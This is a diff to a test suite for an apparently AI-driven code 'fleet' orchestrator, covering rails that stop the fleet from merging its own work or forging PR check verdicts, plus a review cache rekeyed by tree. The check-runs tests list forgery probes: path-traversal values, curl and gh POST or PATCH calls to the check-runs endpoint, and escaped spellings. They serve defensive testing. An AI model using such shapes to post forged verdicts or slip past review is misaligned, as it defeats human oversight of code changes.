@@ -8,8 +8,10 @@ import { existsSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSyn
 import { tmpdir } from 'node:os'
 import { dirname, join, posix } from 'node:path'
 import { execFileSync } from 'node:child_process'
+import { checkRunsViolations, orchestratorSources, MISSING_CHECKS_FILE, REVIEW_AND_MERGE_FILE } from './forgery-rails.js'
+import { commitSha as commitShaOf } from '../../orchestrator/src/gh.js'
 import {
-  runReviewCi, decideReviewGate,
+  runReviewCi, decideReviewGate, CI_DIFF_FLAGS, REVIEW_GATE_STANDING, reviewGateFailsClosed,
   isRepublishOnlyEvent, reviewRequestFor, reviewRequestEventFromEnv, REVIEW_REQUEST_LOGIN,
   type CiContext, type ReviewCiDeps, type ReviewSetDecision,
 } from '../../orchestrator/src/ci.js'
@@ -17,6 +19,7 @@ import { DEFAULT_MAX_TURNS, HIGH_IMPACT_MAX_TURNS, DEFAULT_TIMEOUT_MS, HIGH_IMPA
 import { diffHash, cacheArtifactName, type ReviewCache, type CachedVerdict, type ReviewCacheKey } from '../../orchestrator/src/review-cache.js'
 import type { Lane } from '../../orchestrator/src/config.js'
 import { workspaceAliases } from '../../orchestrator/src/verify.js'
+import { knopeVersionedPaths, knopeChangelogPath, releasePrShape } from '../../orchestrator/src/release-shape.js'
 import type { VerifyReport } from '../../orchestrator/src/verify.js'
 
 describe('rail: a live lane must have a write scope', () => {
@@ -231,19 +234,6 @@ describe('rail: the fleet cannot merge its own changes', () => {
  * below for what does remain.
  */
 describe('rail: the fleet never bypasses a PR\'s checks, and never reviews', () => {
-  function orchestratorSources(): { file: string; text: string }[] {
-    const out: { file: string; text: string }[] = []
-    const walk = (dir: string): void => {
-      for (const e of readdirSync(dir, { withFileTypes: true })) {
-        const full = join(dir, e.name)
-        if (e.isDirectory()) walk(full)
-        else if (e.name.endsWith('.ts')) out.push({ file: full, text: readFileSync(full, 'utf8') })
-      }
-    }
-    walk(join(process.cwd(), 'orchestrator', 'src'))
-    return out
-  }
-
   it('finds orchestrator sources to scan at all — the grep must not pass vacuously', () => {
     expect(orchestratorSources().length).toBeGreaterThan(10)
   })
@@ -392,31 +382,148 @@ describe('rail: the fleet never bypasses a PR\'s checks, and never reviews', () 
   })
 
   /**
-   * The Checks API's `POST /repos/{R}/check-runs` is a write path with real
-   * consequences: whatever it posts becomes a required-status verdict on a
-   * commit, exactly as authoritative as an Actions job's own result. Only
-   * `review-and-merge.ts`'s `postReviewCheckRun` may call it — see that
-   * file's own module comment for why this is the ONE local write path this
-   * design trusts, and why it never gained a `statuses:write`-shaped
-   * capability anywhere else in the orchestrator (ci.ts's own comment above
-   * `VERIFY_JOB`/`REVIEW_JOB` explains why a same-named STATUS was rejected
-   * outright: it is what makes fork PRs unmergeable). A second call site
-   * creating a check-run — however it got there — would be a second,
-   * ungoverned place this process can post a verdict nothing here reviewed.
+   * Where `check-runs` may appear OUTSIDE `review-and-merge.ts`: only as the
+   * tail of the read `repos/${REPO}/commits/${commitSha(x)}/check-runs`, with
+   * `REPO` and `commitSha` resolving to `gh.ts`'s own exports — see
+   * `checkRunsViolations` in `forgery-rails.ts` for the full shape.
+   *
+   * Why the SHA is pinned rather than any `${…}` accepted (#1673's security
+   * review): the rail's previous anchor matched the interpolation's TEXT, never
+   * its value, and `fetch`/`gh api` resolve a `..` (or `%2e%2e`) segment under
+   * WHATWG URL rules — so `commits/${'..'}/check-runs` reached
+   * `repos/{R}/check-runs`, the endpoint that CREATES a check run. A 40-hex SHA
+   * has no dot, percent sign or slash to resolve.
+   *
+   * This is defence in depth, not the boundary. A text rail cannot see a path
+   * assembled from pieces (`'check' + '-runs'`); what decides forgery
+   * resistance is that a PAT cannot create a check run, and only
+   * `review-and-merge.ts` may import the App credential that can — the rail in
+   * `credential-boundary.test.ts`.
    */
   it('creates a check-run from exactly one file (review-and-merge.ts)', () => {
-    const CHECK_RUNS_CREATE = /check-runs/
-    const REVIEW_AND_MERGE_FILE = join(process.cwd(), 'orchestrator', 'src', 'review-and-merge.ts')
-    const hits = orchestratorSources().filter(({ text }) => CHECK_RUNS_CREATE.test(text))
-    expect(hits.map((h) => h.file)).toEqual([REVIEW_AND_MERGE_FILE])
+    const sources = orchestratorSources()
+
+    // Every other file naming the endpoint is confined to the pinned read.
+    expect(checkRunsViolations(sources, REVIEW_AND_MERGE_FILE), 'a file other than review-and-merge.ts names check-runs outside the pinned read').toEqual([])
 
     // And that one file must ACTUALLY post there. Deleting the request and
     // leaving the module comment behind kept this rail green when it was
     // deliberately sabotaged — the same false-green shape as a check once
     // satisfied by a YAML *comment* naming a config file. The endpoint in
     // prose is not the endpoint in a request.
-    expect(hits[0]?.text, 'the one permitted file mentions the endpoint but does not POST to it')
+    const permitted = sources.find((h) => h.file === REVIEW_AND_MERGE_FILE)
+    expect(permitted?.text, 'the one permitted file mentions the endpoint but does not POST to it')
       .toMatch(/method:\s*'POST'[\s\S]{0,200}check-runs`/)
+
+    // The reader this rail was relaxed for must still be there and still be
+    // admitted — a rail that admitted nobody would also pass the clause above.
+    expect(sources.find((s) => s.file === MISSING_CHECKS_FILE)?.text, 'missing-checks.ts no longer reads check-runs through commitSha')
+      .toContain('/commits/${commitSha(sha)}/check-runs')
+  })
+
+  /**
+   * Break the rail on purpose (the repo's rule: verify a gate by injecting the
+   * defect it claims to catch, not by reading the regex). Each case is a
+   * forgery or false-green that an earlier shape of this rail admitted.
+   */
+  describe('the check-runs rail refuses what it exists to refuse', () => {
+    // Probes are placed at missing-checks.ts's path: it is the one admitted
+    // reader, so a forgery written there is the one this rail must still see.
+    const IMPORTS = "import { REPO, commitSha } from './gh.js'\n"
+    const violationsOf = (text: string): string[] => checkRunsViolations([{ file: MISSING_CHECKS_FILE, text: IMPORTS + text }], REVIEW_AND_MERGE_FILE)
+
+    it('admits missing-checks.ts exactly as it stands', () => {
+      expect(checkRunsViolations([{ file: MISSING_CHECKS_FILE, text: readFileSync(MISSING_CHECKS_FILE, 'utf8') }], REVIEW_AND_MERGE_FILE)).toEqual([])
+    })
+
+    it('admits a pinned read in a request', () => {
+      expect(violationsOf('const r = await pagedJson(`repos/${REPO}/commits/${commitSha(sha)}/check-runs?per_page=100`)')).toEqual([])
+    })
+
+    it('refuses a pinned read in any file but missing-checks.ts — main admits none, and this admits one', () => {
+      const other = join(process.cwd(), 'orchestrator', 'src', 'other.ts')
+      const text = IMPORTS + 'const r = await pagedJson(`repos/${REPO}/commits/${commitSha(sha)}/check-runs?per_page=100`)'
+      expect(checkRunsViolations([{ file: other, text }], REVIEW_AND_MERGE_FILE)).not.toEqual([])
+    })
+
+    // The value is what the pin is for: commitSha must refuse every segment
+    // a URL parser would resolve, and hand a real SHA back unchanged.
+    it('commitSha refuses anything but a 40-hex SHA', () => {
+      const sha = 'a'.repeat(40)
+      expect(commitShaOf(sha)).toBe(sha)
+      for (const bad of ['..', '.', '%2e%2e', '%2E%2E', 'a/b', '', `${sha}/..`, sha.toUpperCase(), 'a'.repeat(64), `${sha}?`]) {
+        expect(() => commitShaOf(bad), JSON.stringify(bad)).toThrow()
+      }
+    })
+
+    it('refuses a file whose only check-runs reference is a comment naming the read', () => {
+      expect(violationsOf('// reads commits/${commitSha(sha)}/check-runs\nexport const x = 1\n')).not.toEqual([])
+      expect(violationsOf('/** GET repos/R/commits/${sha}/check-runs */\nexport const x = 1\n')).not.toEqual([])
+    })
+
+    it('refuses a comment alibi beside a write to the bare endpoint', () => {
+      const forged = [
+        '// the read is commits/${commitSha(sha)}/check-runs',
+        'await appApiRequest(http, { method, url: `${GITHUB_API}/repos/${REPO}/check-runs`, body }, secrets, "x")',
+      ].join('\n')
+      expect(violationsOf(forged)).not.toEqual([])
+    })
+
+    // The reviewer's counter-example: the bare endpoint, a write whose method
+    // reaches the request indirectly (so no `method: 'POST'` literal and no
+    // `-f`), in a file that is not review-and-merge.ts, with the read's
+    // path named alongside it.
+    it('refuses a write to repos/${REPO}/check-runs outside review-and-merge.ts', () => {
+      const forged = [
+        'const method = "POST"',
+        'const read = `repos/${REPO}/commits/${commitSha(sha)}/check-runs?per_page=100`',
+        'const token = await mintInstallationToken(http, secrets, "x")',
+        'await fetchAppHttp(http, { method, url: `${GITHUB_API}/repos/${REPO}/check-runs`, headers: { a: token } }, secrets, "x")',
+      ].join('\n')
+      expect(violationsOf(forged)).not.toEqual([])
+    })
+
+    // Each shape is written beside a legitimate pinned read, because that is
+    // what defeated the windowed rail: the read supplied the alibi, and the
+    // write token was one the pattern could not see.
+    const READ = 'const read = `repos/${REPO}/commits/${commitSha(sha)}/check-runs?per_page=100`\n'
+    it.each([
+      ['object shorthand method', 'const method = "POST"\nfetch(`https://api.github.com/repos/${REPO}/check-runs`, { method })'],
+      ['double-quoted method', 'fetch(`${U}/repos/${REPO}/check-runs`, { method: "POST" })'],
+      ['template-literal method', 'fetch(`${U}/repos/${REPO}/check-runs`, { method: `POST` })'],
+      ['gh -X argv', "gh(['api', '-X', 'POST', `repos/${REPO}/check-runs`])"],
+      ['gh --method argv', "gh(['api', '--method', 'POST', `repos/${REPO}/check-runs`])"],
+      ['curl argv', "run(['curl', '-d', '{}', `https://api.github.com/repos/${REPO}/check-runs`])"],
+      ['PATCH of an existing run', 'const method = "PATCH"\nfetch(`${U}/repos/${REPO}/check-runs/${id}`, { method, body: "{\\"conclusion\\":\\"success\\"}" })'],
+      ['method pushed out of any window', 'fetch(`${U}/repos/${REPO}/check-runs`, { headers: {\n' + '  a: "' + 'x'.repeat(900) + '",\n}, method: \'POST\' })'],
+      ['path traversal out of the read', 'fetch(`${U}/repos/${REPO}/commits/${commitSha(sha)}/check-runs/../../check-runs`)'],
+      ['a longer path after the read', 'gh(["api", `repos/${REPO}/commits/${commitSha(sha)}/check-runs/${id}`])'],
+      // #1673's security review: traversal carried in the interpolated VALUE,
+      // before check-runs. Each resolves to repos/{R}/check-runs.
+      ['a literal dot-segment ref', "gh(['api', `repos/${REPO}/commits/${'..'}/check-runs`])"],
+      ['a variable holding a dot-segment', "const up = '..'\ngh(['api', `repos/${REPO}/commits/${up}/check-runs`])"],
+      ['a percent-encoded dot-segment', "gh(['api', `repos/${REPO}/commits/${'%2e%2e'}/check-runs`])"],
+      ['an unvalidated sha parameter', "const read = (sha: string) => gh(['api', `repos/${REPO}/commits/${sha}/check-runs`])"],
+      ['a dot-segment read with a POST beside it', "const r = await fetch(`${U}/repos/${REPO}/commits/${'..'}/check-runs`, { method: 'POST', body })"],
+      // Shapes that keep commitSha in the braces but defeat it some other way.
+      ['a local commitSha shadowing gh.ts', "const x = (s: string) => s\nconst f = (commitSha: (s: string) => string) => `repos/${REPO}/commits/${commitSha('..')}/check-runs`"],
+      ['commitSha from another module', "import { commitSha as cs } from './other-gh.js'\nconst r = `repos/${REPO}/commits/${cs(sha)}/check-runs`"],
+      ['a tagged template that rebuilds the path', 'const r = rebuild`repos/${REPO}/commits/${commitSha(sha)}/check-runs`'],
+      ['a quote inside the template, then traversal', "const r = `repos/${REPO}/commits/${commitSha(sha)}/check-runs'/../../../${tail}`"],
+      ['a prefix that puts the read in the query', 'const r = `${U}/repos/${REPO}/${x}?/commits/${commitSha(sha)}/check-runs`'],
+      ['an escape that hides the spelling from a text scan', "gh(['api', `repos/${REPO}/check\\-runs`, '-X', 'POST'])"],
+    ])('refuses %s', (_name, text) => {
+      expect(violationsOf(READ + text), 'beside a pinned read').not.toEqual([])
+      expect(violationsOf(text), 'alone').not.toEqual([])
+    })
+
+    it('does not let one pinned read alibi a bare mention in the same file', () => {
+      const text = [
+        'const a = `repos/${REPO}/commits/${commitSha(sha)}/check-runs`',
+        'const b = `repos/${REPO}/check-runs`',
+      ].join('\n')
+      expect(violationsOf(text)).not.toEqual([])
+    })
   })
 
   /**
@@ -1882,15 +1989,23 @@ describe('review-cache: pure key functions', () => {
     expect(a).toMatch(/^[0-9a-f]{64}$/)
   })
 
+  const tree = 'f3655875dd861eb24ebf01708a07f4caa0995b43'
+
   it('names an artifact with only characters safe in a URL query param and an Actions artifact name', () => {
-    const name = cacheArtifactName('42', diffHash('anything'))
+    const name = cacheArtifactName('42', tree)
     expect(name).toMatch(/^[a-zA-Z0-9-]+$/)
     expect(name).toContain('42')
   })
 
-  it('never names two different PRs\' identical diffs the same artifact', () => {
-    const hash = diffHash('same diff content')
-    expect(cacheArtifactName('1', hash)).not.toBe(cacheArtifactName('2', hash))
+  it('never names two different PRs\' identical trees the same artifact', () => {
+    expect(cacheArtifactName('1', tree)).not.toBe(cacheArtifactName('2', tree))
+  })
+
+  // #2014: the name states the WHOLE tree it judged, and can never collide
+  // with a diff-keyed record from before (24 hex characters, no `tree-`).
+  it('names the full judged tree, so no diff-keyed record can ever be found under it', () => {
+    expect(cacheArtifactName('42', tree)).toBe(`fleet-review-pass-pr42-tree-${tree}`)
+    expect(cacheArtifactName('42', tree)).not.toMatch(/-pr42-[0-9a-f]{24}$/)
   })
 })
 
@@ -1902,7 +2017,10 @@ describe('review-cache: pure key functions', () => {
  * invoking the engine, record only a fresh PASS, treat a lookup failure
  * exactly like a miss — not whether GitHub's artifact API works.
  */
-describe('rail: fleet/review reviews exactly once per diff, never twice on an identical re-queue', () => {
+describe('rail: fleet/review reviews exactly once per tree, never twice on an identical re-queue', () => {
+  // Two trees for one diff: the same PR replayed onto two different `main`s.
+  const TREE_A = 'f3655875dd861eb24ebf01708a07f4caa0995b43'
+  const TREE_B = '4eeb09ad75c143b8a9e7b23df601af79f0379647'
   const lane = (): Lane => ({
     id: 'ios', mode: 'off', cap: 1, engine: 'claude',
     requireLabel: 'agent-dispatchable', vetoLabels: ['needs-human'],
@@ -1920,14 +2038,15 @@ describe('rail: fleet/review reviews exactly once per diff, never twice on an id
   /** An in-memory `ReviewCache`, seeded with zero or one PASS entries — never
    *  the real Actions-backed one, which this suite is not testing. */
   function fakeCache(seed?: { key: ReviewCacheKey; verdict: CachedVerdict }): ReviewCache & { recordCalls: number } {
+    // Keyed exactly as the real one is (`cacheArtifactName`): PR + tree.
     const store = new Map<string, CachedVerdict>()
-    if (seed !== undefined) store.set(`${seed.key.pr}:${seed.key.diffHash}`, seed.verdict)
+    if (seed !== undefined) store.set(`${seed.key.pr}:${seed.key.headTree}`, seed.verdict)
     const cache = {
       recordCalls: 0,
-      async lookup(key: ReviewCacheKey) { return store.get(`${key.pr}:${key.diffHash}`) },
+      async lookup(key: ReviewCacheKey) { return store.get(`${key.pr}:${key.headTree}`) },
       async record(key: ReviewCacheKey, verdict: CachedVerdict) {
         cache.recordCalls += 1
-        store.set(`${key.pr}:${key.diffHash}`, verdict)
+        store.set(`${key.pr}:${key.headTree}`, verdict)
       },
     }
     return cache
@@ -1947,6 +2066,7 @@ describe('rail: fleet/review reviews exactly once per diff, never twice on an id
     stripExport: async () => {},
     publishReport: async () => {},
     profileReview: vi.fn(async () => ({ verdict: 'PASS' as const, text: 'VERDICT: PASS' })),
+    headTree: async () => TREE_A,
     ...over,
   })
 
@@ -1960,7 +2080,7 @@ describe('rail: fleet/review reviews exactly once per diff, never twice on an id
   it('re-publishes a cached PASS for an identical diff instead of invoking the engine again', async () => {
     const diff = 'diff --git a/x b/x\n+hello\n'
     const cache = fakeCache({
-      key: { pr: '42', diffHash: diffHash(diff) },
+      key: { pr: '42', diffHash: diffHash(diff), headTree: TREE_A },
       verdict: { verdict: 'PASS', text: 'VERDICT: PASS (cached)' },
     })
     const secondOpinion = vi.fn(async () => ({ verdict: 'PASS' as const, text: 'VERDICT: PASS' }))
@@ -1969,12 +2089,11 @@ describe('rail: fleet/review reviews exactly once per diff, never twice on an id
     expect(secondOpinion).not.toHaveBeenCalled()
   })
 
-  // A re-queue after the queue rebases this PR onto a newer main changes the
-  // head SHA but not the PR's own diff — the cache must still hit. Proven
-  // here by feeding the SAME diff text through two calls with a DIFFERENT
-  // ctx.headSha, rather than trusting that the key is diff-based by reading
-  // the implementation.
-  it('hits the cache across two different head SHAs, given the identical diff', async () => {
+  // A no-op rebase changes the head SHA but not the tree — the cache must
+  // still hit (#1987 was exactly this). Proven by feeding the SAME tree
+  // through two calls with a DIFFERENT ctx.headSha, rather than trusting
+  // that the key is not the sha by reading the implementation.
+  it('hits the cache across two different head SHAs, given the identical tree', async () => {
     const diff = 'diff --git a/x b/x\n+hello\n'
     const cache = fakeCache()
     const secondOpinion = vi.fn(async () => ({ verdict: 'PASS' as const, text: 'VERDICT: PASS' }))
@@ -1987,10 +2106,45 @@ describe('rail: fleet/review reviews exactly once per diff, never twice on an id
     expect(secondOpinion).toHaveBeenCalledTimes(1)
   })
 
+  // #2014, the break-it case: #1975 rebased onto a newer `main` kept its
+  // diff byte-for-byte and moved to a different tree, and the diff-keyed
+  // cache re-published the old tree's PASS. The same diff on a NEW tree is
+  // different code and must be reviewed again.
+  it('does NOT hit across two different trees, even given the identical diff (#2014)', async () => {
+    const diff = 'diff --git a/x b/x\n+hello\n'
+    const cache = fakeCache()
+    const secondOpinion = vi.fn(async () => ({ verdict: 'PASS' as const, text: 'VERDICT: PASS' }))
+    await runReviewCi(deps({ cacheFor: () => cache, prDiff: vi.fn(async () => diff), secondOpinion, headTree: async () => TREE_A }))
+    await runReviewCi(deps({
+      cacheFor: () => cache, prDiff: vi.fn(async () => diff), secondOpinion, headTree: async () => TREE_B,
+      ctx: { ...ctx(), headSha: 'e29ed4be950b89143ebe7e510e227a9d05a07e6b' },
+    }))
+    expect(secondOpinion, 'a new tree must be judged afresh, whatever its diff text').toHaveBeenCalledTimes(2)
+  })
+
+  // No tree, no key: an unreadable tree must never be looked up under a
+  // guess, and a verdict formed without one must never be recorded.
+  for (const [label, headTree] of [
+    ['is not wired', undefined],
+    ['throws', async () => { throw new Error('bad object') }],
+    ['is not a tree id', async () => 'not-a-tree'],
+  ] as const) {
+    it(`neither reads nor writes the cache when the head tree ${label}`, async () => {
+      const lookup = vi.fn(async () => ({ verdict: 'PASS' as const, text: 'VERDICT: PASS (cached)' }))
+      const record = vi.fn(async () => {})
+      const secondOpinion = vi.fn(async () => ({ verdict: 'PASS' as const, text: 'VERDICT: PASS' }))
+      const v = await runReviewCi(deps({ cacheFor: () => ({ lookup, record }), secondOpinion, headTree }))
+      expect(v.ok).toBe(true)
+      expect(lookup).not.toHaveBeenCalled()
+      expect(record).not.toHaveBeenCalled()
+      expect(secondOpinion).toHaveBeenCalledTimes(1)
+    })
+  }
+
   // #1158: a SUBSTANTIVE FAIL is reused, and this is the measured reason —
   // 60 Fleet Review runs in one 12-hour window, 10 on one failing PR and 8
   // on another, each re-reviewing an unchanged diff after a branch-freshness
-  // rebase to reach the identical conclusion. The diff hash is what gates
+  // rebase to reach the identical conclusion. The head tree is what gates
   // it: the moment the author pushes anything, the cache is bypassed.
   it('reuses a substantive FAIL for an unchanged diff, instead of re-spending a review to reach the same answer', async () => {
     const diff = 'diff --git a/x b/x\n+bad\n'
@@ -2006,11 +2160,11 @@ describe('rail: fleet/review reviews exactly once per diff, never twice on an id
     expect(failing, 'the unchanged diff must not be reviewed a second time').toHaveBeenCalledTimes(1)
   })
 
-  it('reviews again once the diff itself changes — the cache is keyed on content, not on the PR', async () => {
+  it('reviews again once the tree changes — the cache is keyed on content, not on the PR', async () => {
     const cache = fakeCache()
     const failing = vi.fn(async () => ({ verdict: 'FAIL' as const, text: 'VERDICT: FAIL — leaks a key' }))
     await runReviewCi(deps({ cacheFor: () => cache, prDiff: vi.fn(async () => 'v1'), secondOpinion: failing }))
-    await runReviewCi(deps({ cacheFor: () => cache, prDiff: vi.fn(async () => 'v2 (a fix)'), secondOpinion: failing }))
+    await runReviewCi(deps({ cacheFor: () => cache, prDiff: vi.fn(async () => 'v2 (a fix)'), secondOpinion: failing, headTree: async () => TREE_B }))
     expect(failing).toHaveBeenCalledTimes(2)
   })
 
@@ -2106,11 +2260,16 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
     baseSha: 'base111', headSha: 'head222', pr: '42',
   })
 
+  // The head tree every gate call below reads — the cache KEY (#2014).
+  const TREE = 'f3655875dd861eb24ebf01708a07f4caa0995b43'
+  const gateTree = async (): Promise<string> => TREE
+
   function fakeCache(seed?: { key: ReviewCacheKey; verdict: CachedVerdict }): ReviewCache {
+    // Keyed exactly as the real one is (`cacheArtifactName`): PR + tree.
     const store = new Map<string, CachedVerdict>()
-    if (seed !== undefined) store.set(`${seed.key.pr}:${seed.key.diffHash}`, seed.verdict)
+    if (seed !== undefined) store.set(`${seed.key.pr}:${seed.key.headTree}`, seed.verdict)
     return {
-      async lookup(key: ReviewCacheKey) { return store.get(`${key.pr}:${key.diffHash}`) },
+      async lookup(key: ReviewCacheKey) { return store.get(`${key.pr}:${key.headTree}`) },
       async record() { /* decideReviewGate never records — only runReviewCi does */ },
     }
   }
@@ -2136,11 +2295,11 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   // reusing the cached PASS.
   it('concludes cache-hit when a prior PASS exists, even when this event did not request a review', async () => {
     const cache = fakeCache({
-      key: { pr: '42', diffHash: diffHash(diff) },
+      key: { pr: '42', diffHash: diffHash(diff), headTree: TREE },
       verdict: { verdict: 'PASS', text: 'VERDICT: PASS (cached)' },
     })
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache, requested: false, republishOnly: false, reviewSet: generalOnly, log: () => {},
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache, requested: false, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('cache-hit')
   })
@@ -2150,7 +2309,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   it('concludes not-requested on a cache miss when this event did not request a review', async () => {
     const cache = fakeCache()
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache, requested: false, republishOnly: false, reviewSet: generalOnly, log: () => {},
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache, requested: false, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('not-requested')
   })
@@ -2160,7 +2319,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   it('concludes run-engine on a cache miss when this event requested a review', async () => {
     const cache = fakeCache()
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache, requested: true, republishOnly: false, reviewSet: generalOnly, log: () => {},
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache, requested: true, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('run-engine')
   })
@@ -2174,12 +2333,12 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
       record: async () => {},
     }
     const requestedOutcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache, requested: true, republishOnly: false, reviewSet: generalOnly, log: () => {},
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache, requested: true, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(requestedOutcome.kind).toBe('run-engine')
 
     const unrequestedOutcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache, requested: false, republishOnly: false, reviewSet: generalOnly, log: () => {},
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache, requested: false, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(unrequestedOutcome.kind).toBe('not-requested')
   })
@@ -2189,11 +2348,11 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   // identical diff text.
   it('never cross-publishes a cache hit between two different PRs with the identical diff', async () => {
     const cache = fakeCache({
-      key: { pr: '42', diffHash: diffHash(diff) },
+      key: { pr: '42', diffHash: diffHash(diff), headTree: TREE },
       verdict: { verdict: 'PASS', text: 'VERDICT: PASS (cached)' },
     })
     const outcome = await decideReviewGate({
-      ctx: { ...ctx(), pr: '7' }, prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache, requested: false, republishOnly: false, reviewSet: generalOnly, log: () => {},
+      ctx: { ...ctx(), pr: '7' }, headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache, requested: false, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('not-requested')
   })
@@ -2208,7 +2367,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   it('concludes low-tier for a docs-only diff, even when this event did not request a review', async () => {
     const cache = fakeCache()
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: async () => ['docs/epics/EP01-foo.md'],
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: async () => ['docs/epics/EP01-foo.md'],
       cacheFor: () => cache, requested: false, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('low-tier')
@@ -2221,7 +2380,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   it('concludes low-tier for a verified-inert-data-only diff (Tier 1)', async () => {
     const cache = fakeCache()
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: async () => ['.editorconfig'],
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: async () => ['.editorconfig'],
       cacheFor: () => cache, requested: false, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('low-tier')
@@ -2241,7 +2400,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   it('a diff touching eslint.config.js never concludes low-tier — lint/format config can alter what a gate enforces', async () => {
     const cache = fakeCache()
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: async () => ['eslint.config.js'],
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: async () => ['eslint.config.js'],
       cacheFor: () => cache, requested: true, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('run-engine')
@@ -2258,7 +2417,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   it('a diff touching .claude/agents/ never concludes low-tier — it is Tier 2, unconditionally', async () => {
     const cache = fakeCache()
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: async () => ['.claude/agents/backend-supervisor.md'],
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: async () => ['.claude/agents/backend-supervisor.md'],
       cacheFor: () => cache, requested: false, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('not-requested')
@@ -2275,7 +2434,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   ])('a diff touching %s reaches run-engine once requested — never low-tier', async (f) => {
     const cache = fakeCache()
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: async () => [f],
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: async () => [f],
       cacheFor: () => cache, requested: true, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('run-engine')
@@ -2287,7 +2446,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   it('concludes low-tier for a docs-only diff even when this event DID request a review', async () => {
     const cache = fakeCache()
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: async () => ['docs/epics/EP01-foo.md'],
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: async () => ['docs/epics/EP01-foo.md'],
       cacheFor: () => cache, requested: true, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('low-tier')
@@ -2298,11 +2457,11 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   // `low-tier` is the SECOND check, not the first.
   it('a cache hit is still checked before the tier — cache-hit wins over an otherwise low-tier diff', async () => {
     const cache = fakeCache({
-      key: { pr: '42', diffHash: diffHash(diff) },
+      key: { pr: '42', diffHash: diffHash(diff), headTree: TREE },
       verdict: { verdict: 'PASS', text: 'VERDICT: PASS (cached)' },
     })
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: async () => ['docs/epics/EP01-foo.md'],
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: async () => ['docs/epics/EP01-foo.md'],
       cacheFor: () => cache, requested: false, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('cache-hit')
@@ -2314,7 +2473,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   it('a mixed diff with even one Tier 2 file never concludes low-tier', async () => {
     const cache = fakeCache()
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff,
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff,
       changedFiles: async () => ['docs/epics/EP01-foo.md', 'packages/crypto/src/lib.rs'],
       cacheFor: () => cache, requested: true, republishOnly: false, reviewSet: generalOnly, log: () => {},
     })
@@ -2337,11 +2496,11 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
 
   it('a push with an unchanged diff republishes the cached PASS — the whole point of the trigger', async () => {
     const cache = fakeCache({
-      key: { pr: '42', diffHash: diffHash(diff) },
+      key: { pr: '42', diffHash: diffHash(diff), headTree: TREE },
       verdict: { verdict: 'PASS', text: 'VERDICT: PASS (cached)' },
     })
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files,
